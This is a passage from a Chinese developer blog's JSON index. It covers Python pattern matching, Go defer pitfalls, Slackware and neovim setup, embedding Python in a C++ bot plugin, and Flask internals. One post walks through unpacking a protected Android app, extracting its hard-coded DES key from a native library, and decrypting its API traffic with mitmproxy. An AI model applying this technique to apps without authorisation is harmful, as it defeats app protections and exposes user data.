\u0026#34;Something\u0026#39;s wrong with the Internet\u0026#34;   注意最后一块:“变量名”_充当通配符，永远不会失败。\n你可以使用| (\u0026ldquo;or\u0026rdquo;)将几个字面值组合在一个模式中:\n1 2  case 401 | 403 | 404: return \u0026#34;Not allowed\u0026#34;   模式看起来就像解包赋值，可以用来绑定变量:\n1 2 3 4 5 6 7 8 9 10 11 12  # point is an (x, y) tuple match point: case (0, 0): print(\u0026#34;Origin\u0026#34;) case (0, y): print(f\u0026#34;Y={y}\u0026#34;) case (x, 0): print(f\u0026#34;X={x}\u0026#34;) case (x, y): print(f\u0026#34;X={x}, Y={y}\u0026#34;) case _: raise ValueError(\u0026#34;Not a point\u0026#34;)   仔细研究一下那个!第一个模式有两个字面量，可以认为是上面所示字面量模式的扩展。但是接下来的两个模式组合了一个字面量和一个变量，变量绑定来自 subject (point)的值。第四个模式捕获两个值，这使得它在概念上类似于解包赋值(x, y) = point。\n如果你使用类来构造数据，你可以使用类名后跟一个类似构造函数的参数列表，但是可以将属性捕获到变量中:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Point: x: int y: int def where_is(point): match point: case Point(x=0, y=0): print(\u0026#34;Origin\u0026#34;) case Point(x=0, y=y): print(f\u0026#34;Y={y}\u0026#34;) case Point(x=x, y=0): print(f\u0026#34;X={x}\u0026#34;) case Point(): print(\u0026#34;Somewhere else\u0026#34;) case _: print(\u0026#34;Not a point\u0026#34;)   你可以在一些内置类中使用位置参数，这些类为它们的属性(例如数据类)提供排序。你也可以通过在你的类中设置__match_args__特殊属性来定义模式中属性的特定位置。如果它被设置为(\u0026quot;x\u0026quot;， \u0026quot;y\u0026quot;)，以下模式都是等价的(并且都将y属性绑定到var变量):\n1 2 3 4  Point(1, var) Point(1, y=var) Point(x=1, y=var) Point(y=var, x=1)   模式可以任意嵌套。例如，如果我们有一个简短的点列表，我们可以这样匹配:\n1 2 3 4 5 6 7 8 9 10 11  match points: case []: print(\u0026#34;No points\u0026#34;) case [Point(0, 0)]: print(\u0026#34;The origin\u0026#34;) case [Point(x, y)]: print(f\u0026#34;Single point {x}, {y}\u0026#34;) case [Point(0, y1), Point(0, y2)]: print(f\u0026#34;Two on the Y axis at {y1}, {y2}\u0026#34;) case _: print(\u0026#34;Something else\u0026#34;)   我们可以向模式添加一个if子句，称为“guard”。如果 guard 为假，match 继续尝试下一个case块。注意，值捕获发生在guard求值之前:\n1 2 3 4 5  match point: case Point(x, y) if x == y: print(f\u0026#34;Y=X at {x}\u0026#34;) case Point(x, y): print(f\u0026#34;Not on the diagonal\u0026#34;)   其他几个关键功能:\n  与解包赋值一样，元组和列表模式具有完全相同的含义，并且实际上匹配任意序列。一个重要的异常是它们不匹配迭代器或字符串。(技术上讲，subject 必须是collections.abc.Sequence的一个实例。)\n  序列模式支持通配符:[x, y， *rest]和(x, y， *rest)在解包赋值时的工作类似于通配符。*后面的名称也可以是_，所以(x, y， *_)匹配至少有两个项的序列，而不绑定其余的项。\n  映射模式:{\u0026quot;bandwidth\u0026quot;: b， \u0026quot;latency\u0026quot;: l}从字典中捕获\u0026quot;bandwidth\u0026quot;和\u0026quot;latency\u0026quot;值。与序列模式不同，额外的键被忽略。还支持通配符**rest。(但是**_是多余的，所以不允许。)\n  可以使用as关键字捕获子模式:\n1  case (Point(x1, y1), Point(x2, y2) as p2): ...     大多数字面值的比较是==的，但是单例的True、False和None是通过id进行比较的。\n  模式可以使用命名的常量。这些必须用点命名，以防止它们被解释为捕获变量:\n1 2 3 4 5 6 7 8 9 10 11 12 13  from enum import Enum class Color(Enum): RED = 0 GREEN = 1 BLUE = 2 match color: case Color.RED: print(\u0026#34;I see red!\u0026#34;) case Color.GREEN: print(\u0026#34;Grass is green\u0026#34;) case Color.BLUE: print(\u0026#34;I\u0026#39;m feeling the blues :(\u0026#34;)     原文档版权声明 This document is placed in the public domain or under the CC0-1.0-Universal license, whichever is more permissive.\nSource: https://github.com/python/peps/blob/master/pep-0636.rst\n","date":"2021-03-19T10:19:06+08:00","permalink":"https://nnnewb.github.io/blog/p/pattern-match-in-python310/","title":"pattern-match-in-python310"},{"content":"昨天对项目做了个小重构，主要是对以前手写的 stmt.Close 没处理返回值的问题、还有各种该记录日志的地方没记日志等等，做了下处理。\n老实说这事儿做着做着还有种奇妙的快感，类似于看高压水枪清污视频的感觉。哈哈，也亏领导不管事，代码也不 Review ，测试=摆设。\n这不一上班就发现好多问题，幸好只推送到内网。\n笑中带泪.gif\n0x01 问题描述 问题倒是挺简单的，看下面的代码。\n1 2 3 4 5 6 7 8 9 10 11  stmt := db.Prepare(query) defer SilentLogError(stmt.Close(), \u0026#34;stmt close failed\u0026#34;) row := stmt.QueryRow(params...) defer row.Close() if err = row.Scan(vars...); err != nil { return nil, err } return vars, nil   那么，请问上面的代码有什么问题呢？\n标题都说了 defer 了，那问题肯定是出在 defer 这一行上。\n0x02 defer 的求值 简单的结论就是: defer f() 的参数在 defer 这一行求值\n具体到上面的例子，defer f(i()) 这样的形式，可以先分成三个部分。\n defer 本身的执行时机 i() 的求值时机 f() 的求值时机  把这三部分排一下序:\n i() defer  defer 把参数求值后包装成一个新函数延迟执行\n  f()  0x03 循环内 defer 循环内 defer 主要有两个问题\n 可能产生造成巨量的 defer 函数，耗尽内存或拖垮执行速度 在一些情况下会造成意料外的结果  看例子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  package main import \u0026#34;fmt\u0026#34; type Conn struct { ID int } func NewConn(id int) *Conn { return \u0026amp;Conn{ID: id} } func (c *Conn) Close() error { fmt.Printf(\u0026#34;close %d!\\n\u0026#34;, c.ID) return nil } func main() { arr := make([]Conn, 5) for i := range arr { arr[i].ID = i } for _, conn := range arr { defer conn.Close() } }   最终输出是\n1 2 3 4 5  close 4! close 4! close 4! close 4! close 4!   造成这一结果的原因是接收器(receiver)也作为函数参数的一部分在 defer 时被求值。\nfor _, conn := range arr 这一行代码中，conn 本质是一个局部变量，其内存在循环期间可以视作固定的，而func (c *Conn) Close() error 接收器取了这个局部变量的地址：每一次循环，调用 Close 时，取得的都是同一个地址。最终导致 Close 的全部都是 conn 在函数结束时最后得到的值。\n类似的，如果把接收器从指针改成值呢？接收器变成了值传递，将conn复制一次后保留作为 defer 函数执行时的参数，就会有正常的结果。\n但并不是说循环内 defer 一定是 不好的。\n比如一个常见的场景，在循环里使用 SQL 查询。\n1 2 3 4  for query := queries { rows := db.Query(query) defer rows.Close() }   可以明确知道 rows 是指针，而且 rows.Close 有指针接收器，就可以确定不会有问题。\n0x04 defer 和闭包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  package main import \u0026#34;fmt\u0026#34; type Conn struct { ID int } func NewConn(id int) *Conn { return \u0026amp;Conn{ID: id} } func (c *Conn) Close() error { fmt.Printf(\u0026#34;close %d!\\n\u0026#34;, c.ID) return nil } func main() { conn := \u0026amp;Conn{1} defer func() { conn.Close() }() conn = \u0026amp;Conn{2} defer func() { conn.Close() }() }   和上面类似，这次输出是:\n1 2  close 2! close 2!   问题出现在 defer 后面这个画蛇添足的 func(){}() 上。众所周知 defer 会对参数求值，但闭包捕获的变量并不会。\n因此，即使 defer conn.Close() 工作正常，但 defer defer func() {conn.Close()}() 就不一定了。两者在部分情况下并不能等价代换，除非你确信了解自己做了什么。\n如果一定要用 func(){}() 的形式，那么 conn 只能通过参数形式传递给这个匿名函数。\n1 2 3  defer func(conn *Conn){ _ = conn.Close() }(conn)   对，说的就是烦人的未处理的错误警告。\n0x05 Happy Hacking! 惯例，完。\n","date":"2021-01-05T10:01:48+08:00","permalink":"https://nnnewb.github.io/blog/p/go-%E7%9A%84-defer-%E8%AF%AD%E5%8F%A5/","title":"go 的 defer 语句"},{"content":"最近在虚拟机里折腾 slackware ，发现 slackware 14.2 的 vim 版本还停留在 7.4 ，于是考虑还是装个 neovim 算了。毕竟升级 vim8 还得自己写 SlackBuild，万一和原本的 vim 7.4 冲突就更头疼了。\n0x01 确定依赖 到处翻 slackbuild 之间依赖关系的时候发现 sbopkg 提供了一个解决依赖的脚本，sqg。\n于是简单点，拿 sqg -p neovim 生成 neovim 的安装队列 neovim.sqf 文件。\nsqg 和 sbopkg 一起提供了，所以不用另外安装。\n0x02 安装 一条命令：sudo sbopkg -i neovim.sqf\n然后等完成吧。\n0x03 可选依赖 上述步骤完成后还只是装好基本的 neovim ，但 python2/python3/ruby/nodejs 支持都是没有的。\n打开 nvim，输入命令 :checkhealth 后会显示缺少支持，同时也提供了解决办法：pip install pynvim。\n然后就是另一个坑：pip 也不在默认的 python2 包里。于是为了解决这个问题，还得先装上 pip : sudo sbopkg -i python-pip\n然后执行 sudo pip install pynvim，此时 python2 支持已经装好。\n不过众所周知 python2 的生命周期已经结束了，python3 才是正道。所以还得装一下 python3 : sudo sbopkg -i python3\nslackbuild 的 python3 包自带了 pip 所以一切安好。完成后直接装 pynvim 即可: sudo pip3 install pynvim\nnodejs 和 ruby 不是我的工作语言就不管了。\n0x04 使用 vim 配置 另一个问题是我的 vimrc 配置是针对 vim8 写的，neovim 不认 .vimrc 和 .vim 。这个问题网上有很多解决办法，我复制粘贴下。\n Transitioning from Vim nvim-from-vim\n  To start the transition, create your |init.vim| (user config) file:\n:call mkdir(stdpath(\u0026lsquo;config\u0026rsquo;), \u0026lsquo;p\u0026rsquo;) :exe \u0026lsquo;edit \u0026lsquo;.stdpath(\u0026lsquo;config\u0026rsquo;).'/init.vim\u0026rsquo;\n  Add these contents to the file:\nset runtimepath^=~/.vim runtimepath+=~/.vim/after let \u0026amp;packpath = \u0026amp;runtimepath source ~/.vimrc\n  Restart Nvim, your existing Vim config will be loaded.\n   完事即可认出 vim 配置。\n0x05 Happy Hacking ! 完\n","date":"2021-01-04T15:00:20+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%9C%A8-slackware-%E4%B8%8A%E5%AE%89%E8%A3%85-neovim/","title":"在 slackware 上安装 neovim"},{"content":"slackware 是一个非常有极客味的 Linux 发行版，因为官方维护的包不多，基本靠 slackbuilds 续命。\nslackware 的一个特色是包管理系统不处理依赖关系，这一点劝退不少人。\n实际上，虽然我不是很赞同 这个观点 ，不过并不妨碍 slackware 成为可玩性相对高的 Linux 发行版之一（另外几个可玩性不错的发行版包括 Arch Linux 和 Gentoo）。\n这篇博文实际上就是安利下 slackware 并且简要介绍下怎么在虚拟机里搭建个基本环境来体验游玩。\n0x01 安装 安装的参考文档太多了，个人认为主要的难点在分区和引导。毕竟不像其他更流行的发行版的 GUI 安装引导，对 fdisk 和 parted 这些工具不熟悉、对操作系统引导启动的一些基本概念、原理不了解的人很容易犯下错误而不自知。\n这里提供一篇之前在贴吧写的 安装教程 ，不做赘述了。\n0x02 桌面 对习惯了装完就有桌面的用户来说，安装完 slackware 之后遇到的第一个问题就是怎么进入桌面——甚至会问怎么登陆。\n这里就挂一张 gif 好了。\n假设没手贱在安装的时候把 x/kde/xfce 之类的软件包组给去掉的话，就不会有什么问题。\n如果需要自动进入桌面，需要手动修改 /etc/inittab 文件，把默认的 runlevel 修改为 4 。\n具体怎么改，看 gif 。\n0x03 slackpkg 包管理 如果用过 ubuntu ，那么下一个问题可能就是 \u0026ldquo;怎么没有 apt-get 命令？\u0026rdquo; 或者 \u0026ldquo;slackware 用什么命令安装软件？\u0026rdquo;\n答案是有好几个相关命令。\n installpkg removepkg upgradepkg makepkg explodepkg rpm2targz  大部分命令顾名思义，也不需要额外说明。如果说和 apt 或者 pacman 类似的一个统一的包管理器的话，那就是 slackpkg 。\n使用 slackpkg 之前，需要手动修改 /etc/slackpkg/mirrors 文件，选择一个网络状况比较好的软件源地址，把行开头的 # 号去掉。\n完事之后用命令 slackpkg update 更新一下本地索引，就可以正常用了。\n常用的命令包括\n slackpkg search slackpkg file-search slackpkg install slackpkg install-new slackpkg upgrade slackpkg upgrade-all  具体不细说了，看参考链接，或者自己看看 man slackpkg 或者 slackpkg help\n此外还有个不常用的，和安装时的 setup 风格比较类似的工具，pkgtool。具体可以自己看看命令。\n0x04 SlackBuilds 用过 Arch Linux 的 AUR 的用户对这种第三方维护的软件包会比较熟悉， SlackBuilds 对这些用户来说就是另一个 AUR 而已。\n不同之处在于，SlackBuilds 需要手动下载脚本和源码，然后自己看 README 再运行编译。\n当然这不是说 SlackBuilds 没有类似 yaourt 或者 yay 之类的自动工具，你可以试试 sbopkg 。\n这里给个简单的例子，用 sbopkg 安装 fbterm 。\n0x05 编写 SlackBuilds 讲道理，slackware 常用的软件太少，基本全靠 slackbuilds 撑场面。如果 SlackBuilds 上也没有呢？\n那只能自己写吧。\n对于熟悉 bash 脚本的用户来说这不是什么难事。这篇 HOWTO 文章 很好地说明了怎么写一个 SlackBuilds 脚本。\n0x06 参与社区 slackware 中文社区太小了，或者说根本不存在。\n能聊几句的基本只有贴吧（实际上现在也找不到人了）或者 GitHub 上（slackwarecn 社区也不活跃）。\n如果对 slackware 感兴趣，可以玩一玩，写几个常用软件的 SlackBuilds 脚本什么的。\n就这样吧。\n","date":"2020-12-30T11:11:56+08:00","permalink":"https://nnnewb.github.io/blog/p/slackware-%E5%92%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/","title":"slackware 和虚拟机基本配置"},{"content":"说起来也不算什么新鲜的东西，现成的工具拼拼凑凑就搞定了，单纯算是点亮了新的技能。\n待破解应用的名字不透露了，避免引火烧身。\n需要准备的工具包括\n mumu 模拟器(或者别的什么有 root 权限、能装 xposed 的模拟器) FDex2 脱壳 jadx 反编译 dex 源码 apktools 拆解 apk mitmproxy 中间人拦截网络请求  0x01 目标和方向选择 首要的目标是破解这个软件的 api 加密。\n使用 mitmproxy 抓到 https 流量，发现请求体全部是 base64 ，解码发现乱码。基本断定是加密了。\n mitmproxy 怎么抓 https 流量不多说了，基本流程就是装证书，然后配置代理。能看到有流量进 mitmproxy 就算成功了。\n直接参考 mitmproxy 的文档快一点。\n 搜了一圈没有什么现成的对这个 App 的破解的文章，于是决定自己动手。\n0x02 解包和脱壳 先确认下电脑上装了 JDK 或者 JRE ，没有的话就装好。\n推荐一个 vscode 的插件，apklab。会帮你装好 jadx 和 apktools / signer 这些工具。\n接下来直接用 apklab 打开需要破解的 apk 文件。\napklab 会自动用 apktools 和 jadx 完成拆包和反编译。\n然后简单观察\u0026hellip;\n应该是被 360 加固了。\napk 加固的基本原理就是把易被反编译的 java 字节码转译或者加密后保存，运行的时候再释放出来。用过 upx 一类的软件应该会联想到，就是加壳、反调试什么的这一套。\nxposed 提供了一个在安卓包加载时设置钩子的机会，将 ClassLoader Hook 掉，以此获得真正的应用字节码。\n代码看参考资料。\n安装 xposed 框架和 FDex2 之后启动目标应用，即可获得对应的字节码 dex 文件。\n接着把这些 dex 文件复制出来，即可使用 jadx 反编译到 java 了。\n1  jadx -d out *.dex   将反编译的结果用 vscode 打开，可以看到目标已经被我们脱干净了。\n0x03 寻找加解密代码 目标是解密 Api 请求的内容，所以下一步就是找到哪里保存了加密代码。\n幸运的是这个 App 没有做过混淆，完成脱壳后就已经是全身赤裸的站在我们面前了。\n直接在代码里搜索之前我们观察到的 url：index_des.php，仅有一个结果。\n相关函数非常短，这个 HTTP 框架我没有使用过，不过从函数名看应该是一个中间件模式，对所有 Web 请求进行加密处理。\ngetOverPost2 源码如下\n从代码里可以得出：\n g 的含义是 Get 请求的参数，应该就是 QueryString。函数名 getOverPost2 字面意义就是把 GET 请求以 POST 方式发送出去。 p 的含义大概就是 Post 的参数了。 加密代码在 encryptByte  如此看来已经接近终点了，再点开 encryptByte 的定义\n密钥保存在 DesLib.sharedInstance().getAuthKey() 中。\n接着点开 getAuthKey 的定义:\nnative 关键字一出，得，白高兴了。差点劝退成功。\n还是先看下怎么加密的。\n再往回翻一下响应解密的代码，免得拆除密钥来又白高兴一场。\n很好，也是 DES 。\n其实到这一步已经基本完成解密了，唯一欠缺的就是密钥。\n抱着试一试的心情，还是找到了 libencry.so ，用 IDA 打开分析了一下。\n一通操作猛如虎，结果发现看不懂汇编。=w=\n按下 F5，看看伪代码。\n还是看不懂。这都调的什么函数\u0026hellip; a1 + 668 这个蜜汁偏移也不知道是在算什么。\n网上搜索了一圈，说道可以手动改一下函数签名，IDA 就能提示出函数了。试试看。\n先把函数签名纠正\n再关掉类型转换\n最终关键代码清晰了很多，看起来就是个直接返回字符串常量的函数。\n比较具有迷惑性的是上面的 v5-v9，可以看到 v5-v9 地址是增长、连续的，只有 v5 和 v6 有值。v7/v8/v9 都是 0 。而 v5 的地址被用作 NewStringUTF 函数的参数。查阅 JNI 接口也可以看到这个参数应该是 const char* 类型。\n所以 \u0026hellip;\n把数值转换成 16 进制再做观察。\n发现很有规律，每个字节的值都在 ASCII 范围内。于是右键转换成字符串，再按字节序翻转一下，即可得到密钥。\n到此，解密方法的探索已经完成。\n0x04 mitmproxy 解密 mitmproxy 支持使用 python 脚本扩展，用法很简单就是 mitmweb.exe -s decrypt.py\n可以参考 mitmproxy 的例子\n最终效果应该是这样\n核心的解密代码就一句，利用 mitmproxy 的扩展即可对每个请求进行统一的处理。\n1 2 3 4  from pyDes import des, PAD_PKCS5 def decrypt(data: Union[str, bytes]) -\u0026gt; bytes: return des(key).decrypt(data, padmode=PAD_PKCS5)   0x05 结语 这个破解的最大意义还是完成了一次完整的安卓逆向，算是点亮了新技能。\n以后再遇到一些傻逼软件或者强制推广的东西就可以用这一手技能来研究吐槽下都什么傻逼代码了。\n当然非法的事情是不可能做的。\n这玩意儿破解完之后发现有泄露隐私、被脱裤的严重漏洞，我也给市政平台发了件。\n所以明年如果再硬推一次的话，到时候再拆了看看是不是有点长进。当然，没人管应该才是常态。\n","date":"2020-12-29T14:04:02+08:00","permalink":"https://nnnewb.github.io/blog/p/%E4%B8%80%E4%B8%AA%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","title":"一个安卓应用的逆向分析"},{"content":"先不说废话，项目地址：https://github.com/nnnewb/CQPy 。欢迎给个 Star 什么的。\n背景 想给最近在玩的酷 Q 写个插件，发现没有合适的直接使用 Python 的解决方案。\nRichard Chien 提供了一个比较通用的插件，CQHttp。CQHttp本体是用 C++ 编写的插件，将酷 Q 的回调包装成 HTTP 请求转发至指定的地址，支持http和websocket两种协议。\n不过由于个人想折腾折腾的想法，打算试试把 Python 解释器直接嵌入到 C++ 里得了。\n整个思路如下。\n1 2 3 4 5  graph LR; CQP[酷Q] --事件回调--\u0026gt; dll[插件DLL]; dll --事件回调--\u0026gt; python[Python脚本]; python --调用API--\u0026gt; dll; dll --调用API--\u0026gt; CQP;   依赖 为了简化操作 Python 接口，我没有使用 Python 自带的 C API，而是pybind11，使用vcpkg管理依赖。\n安装命令：\n1  vcpkg install pybind11:x86-windows   0x1 编译 DLL 我使用 CMake 作为编译系统，因此可以很简单地写一个编译出 DLL 的 CMakeLists.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  cmake_minimum_required(VERSION 3.15)project(top.weak-ptr.cqpy LANGUAGES CXX VERSION 0.1.0)include_directories(src)aux_source_directory(src SOURCES)set(CMAKE_CXX_STANDARD 17)# 引入 pybind11 find_package(pybind11 CONFIG REQUIRED)# 添加 target set(OUT_NAME \u0026#34;app\u0026#34;)add_library(${OUT_NAME} SHARED ${SOURCES})set_target_properties(${OUT_NAME} PROPERTIES LINKER_LANGUAGE CXX)target_link_libraries(${OUT_NAME} PRIVATE pybind11::embed)  源代码使用 MSVC 和 MinGW 编译，另外再处理下源码编码的问题和宏。\n主要涉及的几个问题：\n MSVC 编译时通过/utf-8编译参数指定源码文件的编码。 MSVC 编译pybind11时需要指定 -DNOMINMAX，这是pybind11要求的。 因为使用 VCPKG 管理依赖，MSVC 编译时还需要设置链接属性。 MinGW 编译时，指定 -static 避免依赖 libgcc 之类的 dll，最终编译结果只依赖于 libpython3.7.dll。 MinGW 编译时，指定 -Wl,--kill-at,--enable-stdcall-fixup，来确保导出的 DLL API 名字没有下划线开头和@\u0026lt;参数大小\u0026gt;的后缀。  1 2 3 4 5 6 7 8 9 10 11 12 13  # 添加编译参数 add_compile_definitions(APP_ID=\u0026#34;${PROJECT_NAME}\u0026#34;)add_definitions(-DAPP_ID=\u0026#34;top.weak-ptr.cqpy\u0026#34;)if (MSVC) add_compile_options(/utf-8) add_definitions(-DNOMINMAX) # 设置静态链接  set(VCPKG_CRT_LINKAGE STATIC) set(VCPKG_LIBRARY_LINKAGE STATIC)else () add_link_options(-static -Wl,--kill-at,--enable-stdcall-fixup)endif (MSVC)  最后的构建命令：\n1 2 3 4 5 6 7 8  mkdir build cd build cmake .. \\ \u0026#34;-GVisual Studio 16 2019\u0026#34; \\ -AWin32 \\ -DCMAKE_TOOLCHAIN_FILE=/path/to/your/vcpkg/scripts/buildsystems/vcpkg.cmake \\ cmake --build . cmake install   MinGW 对应改下 Generator，去掉-AWin32和后面的-DCMAKE_TOOLCHAIN_FILE=/path/to/your/vcpkg/scripts/buildsystems/vcpkg.cmake即可。\n0x2 MSVC 编译导出 DLL 的问题 参考 MSDN 的文档，使用下面的方式无法正确导出 DLL 接口。\n1  extern \u0026#34;C\u0026#34; __declspec(dllexport) int __stdcall test() {}   最终采用的是__pragma的方式指定导出名，如下。\n1 2 3 4 5 6  #define DLL_EXPORT extern \u0026#34;C\u0026#34; __declspec(dllexport)  #define CQ_EXPORT(ReturnType, FuncName, ParamsSize, ...) \\ __pragma( \\ comment(linker, \u0026#34;/EXPORT:\u0026#34; #FuncName \u0026#34;=_\u0026#34; #FuncName \u0026#34;@\u0026#34; #ParamsSize)) \\ DLL_EXPORT ReturnType __stdcall FuncName(__VA_ARGS__)   注意__pragma只能在 MSVC 中使用，所以要加上条件判断。\n1 2 3 4 5 6 7 8 9 10 11  #define DLL_EXPORT extern \u0026#34;C\u0026#34; __declspec(dllexport)  #if defined(_MSC_VER) #define CQ_EXPORT(ReturnType, FuncName, ParamsSize, ...) \\ __pragma( \\ comment(linker, \u0026#34;/EXPORT:\u0026#34; #FuncName \u0026#34;=_\u0026#34; #FuncName \u0026#34;@\u0026#34; #ParamsSize)) \\ DLL_EXPORT ReturnType __stdcall FuncName(__VA_ARGS__) #else #define CQ_EXPORT(ReturnType, FuncName, ParamsSize, ...) \\ DLL_EXPORT ReturnType __stdcall FuncName(__VA_ARGS__) #endif   理论上也能用.def文件来定义导出表，可以自行尝试下。\n0x3 导入 CQP.dll 的 API 的问题 首先要知道CQP.dll也会加载到CQP.exe中，插件也会加载到CQP.exe中，所以我们需要的就是使用 Windows API 获取到CQP.dll的 Handle 再进行操作。\n大致代码如下。\n1 2  const auto dll = GetModuleHandleW(L\u0026#34;CQP.dll\u0026#34;); const auto CQ_addLog = reinterpret_cast\u0026lt;int32_t (__stdcall *)(int32_t,int32_t,const char*,const char*)\u0026gt;(GetProcAddress(dll, \u0026#34;CQ_addLog\u0026#34;));   通过两个 API 调用即可获得需要的函数指针了。\n0x4 嵌入 Python 解释器 到了这一步已经非常简单了，pybind11提供了高度封装的 C++ API。可以直接参考这个文档。\n再给个简单的例子代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  template \u0026lt;typename... Args\u0026gt; inline int32_t py_callback(const std::string \u0026amp;py_func, Args... args) { auto guard = std::lock_guard(lock); try { auto m = py::module::import(\u0026#34;cqpy._callback\u0026#34;); return m.attr(py_func.c_str())(args...).template cast\u0026lt;int32_t\u0026gt;(); } catch (const py::error_already_set \u0026amp;e) { logging::error(e.what()); // 记录 python 错误到日志  return -1; } } // 启用插件 CQ_EXPORT(int32_t, cq_event_enable, 0) { py::initialize_interpreter(); // 设置 AUTH_CODE，但是暂时还不能使用酷Q的API  auto _embed = py::module::import(\u0026#34;_embed\u0026#34;); _embed.attr(\u0026#34;AUTH_CODE\u0026#34;) = AUTH_CODE; // 初始化 Python 解释器环境，把数据目录加入 python path  auto raw_app_dir = std::string(CQ_getAppDirectory(AUTH_CODE)); auto app_dir = py::bytes(raw_app_dir).attr(\u0026#34;decode\u0026#34;)(\u0026#34;gb18030\u0026#34;).cast\u0026lt;py::str\u0026gt;(); auto sys = py::module::import(\u0026#34;sys\u0026#34;); sys.attr(\u0026#34;path\u0026#34;).attr(\u0026#34;append\u0026#34;)(app_dir); // 初始化完成  logging::info(\u0026#34;Python interpreter initialized.\u0026#34;); return py_callback(\u0026#34;on_enable\u0026#34;); }   需要注意的是，虽然在前面通过相关参数指定了静态链接，但实际Python3.7.dll还是动态链接上去的。\n所以分发这样编译出来的 dll，依然需要用户先安装一个 Python3.7，或者把 Python3.7.dll 也一起分发出去。\n如果要完全的静态链接，可能要自行编译 Python 源代码。实在太麻烦，就懒得弄了。\n0x5 踩的坑 通过 Python 调用 C++ 端提供的 API 时，特别注意参数一定要一一对应，特别是数据类型，一旦不匹配或传入数据有误（例如 None），可能造成 C++ 端内存异常，需要挂调试器才能发现原因，非常麻烦。\nsys是builtin的库，和os不同，如果分发的用户没有安装 Python，只有一个 Python3.7.dll的话，很多 Python 自带的库是用不了的。例如说json、logging、甚至os。这个应该算是常识，但最好一开始就意识到：你的用户还是要装一个 Python 才行。\n关于 VirtualEnv 支持，建议直接参考PEP 405。不多赘述。比较简单的处理就是把VENV\\Lib\\site-packages加入到sys.path里。\n能不能把所有 Python 代码和 dll 都打包进 dll 里？大致原理就是丢进rc里，但实际很麻烦，看py2exe迄今为止还有一大堆坑就知道有多麻烦了。\n","date":"2020-02-07T21:59:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%9C%A8c-%E4%B8%AD%E5%B5%8C%E5%85%A5python%E8%A7%A3%E9%87%8A%E5%99%A8/","title":"在C++中嵌入Python解释器"},{"content":"0. Intro Flask 是一个基于 WSGI 协议的上层应用框架，据我了解应该是和 Tornado、Django 流行程度相近，当然 Django 老大哥始终占据了最多的份额。Flask 是一个轻量级的 Micro Framework，源码值得一读。\n1. 回顾 WSGI 开始之前，需要先回顾以下 WSGI 协议。\nWSGI 是一个针对 Python 的协议，故说到的 App、Server、函数、参数等描述都是指 Python 对应的概念或实现。\n1.1 PEP-0333 到 PEP-3333 PEP-0333 是初版的 WSGI 协议提案，PEP-3333 是 1.0.1 版本的 WSGI 提案，差别不大，主要是对 py3 和 py2 不兼容的部分作了更新说明（str和unicode方面的问题，python2 的 str 在 python3 是 bytes，故 python3 编写的 wsgi app 必须返回 bytes）。\nWSGI 协议规范了 Python Web 应用的两个层级：服务器层（Server）和应用层（Application），两者通过 WSGI 协议进行通信。\n其中 Server 负责处理请求，将请求转换成符合 WSGI 要求的模式（environ参数）。 Application 完成处理后再通知 Server 返回 Response（start_response参数）。\nWSGI 规定 App 必须是一个可以被调用的对象，接受指定数量的参数，WSGI Server 不关注任何其他 App 实现细节。而 WSGI App 也应当遵守这一要求，对 start_response 参数也遵守不依赖于任何 WSGI Server 的实现细节。\nWSGI App 的接口规范声明如下。\n1  def app(environ, start_response): ...   start_response的声明如下。\n1  def start_response(status, response_headers, exc_info=None): ...   1.2 WSGI Server 常见的 WSGI Server 有几个。Nginx 和 Apache 都有 WSGI 插件，除此之外还有 gunicorn、gevent.wsgi 等。\n举一个典型的例子来说。\n1 2 3 4 5 6 7 8  # app.py import wsgiserver def app(environ, start_response): start_response(\u0026#39;200 OK\u0026#39;, [(\u0026#39;Content-Type\u0026#39;,\u0026#39;text-plain\u0026#39;)]) return [b\u0026#34;Hello world!\u0026#34;] wsgiserver.WSGIServer(app, host=\u0026#39;127.0.0.1\u0026#39;, port=\u0026#39;5000\u0026#39;).start()   在 windows 下使用如下命令安装 wsgiserver\n1  pip install wsgiserver   最后执行\n1  python app.py   2. 入口点 看完 WSGI ，接下来看 Flask 请求的入口点在哪儿。\n2.1 WSGI Server 与 .run Flask这个类定义于flask.app，看这里的代码。\n1 2  class Flask(_PackageBoundObject): ...   先不去管 _PackageBoundObject 是啥。我们知道 Flask有一个run方法可以快速启动服务，直接跳转到那儿。\n flask/app.py COMMIT a74864e , Line 844 ~ 949\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  def run(self, host=None, port=None, debug=None, load_dotenv=True, **options): \u0026#34;\u0026#34;\u0026#34; 略 \u0026#34;\u0026#34;\u0026#34; # Change this into a no-op if the server is invoked from the # command line. Have a look at cli.py for more information. if os.environ.get(\u0026#39;FLASK_RUN_FROM_CLI\u0026#39;) == \u0026#39;true\u0026#39;: from .debughelpers import explain_ignored_app_run explain_ignored_app_run() return if get_load_dotenv(load_dotenv): cli.load_dotenv() # if set, let env vars override previous values if \u0026#39;FLASK_ENV\u0026#39; in os.environ: self.env = get_env() self.debug = get_debug_flag() elif \u0026#39;FLASK_DEBUG\u0026#39; in os.environ: self.debug = get_debug_flag() # debug passed to method overrides all other sources if debug is not None: self.debug = bool(debug) _host = \u0026#39;127.0.0.1\u0026#39; _port = 5000 server_name = self.config.get(\u0026#39;SERVER_NAME\u0026#39;) sn_host, sn_port = None, None if server_name: sn_host, _, sn_port = server_name.partition(\u0026#39;:\u0026#39;) host = host or sn_host or _host port = int(port or sn_port or _port) options.setdefault(\u0026#39;use_reloader\u0026#39;, self.debug) options.setdefault(\u0026#39;use_debugger\u0026#39;, self.debug) options.setdefault(\u0026#39;threaded\u0026#39;, True) cli.show_server_banner(self.env, self.debug, self.name, False) from werkzeug.serving import run_simple try: run_simple(host, port, self, **options) finally: # reset the first request information if the development server # reset normally. This makes it possible to restart the server # without reloader and that 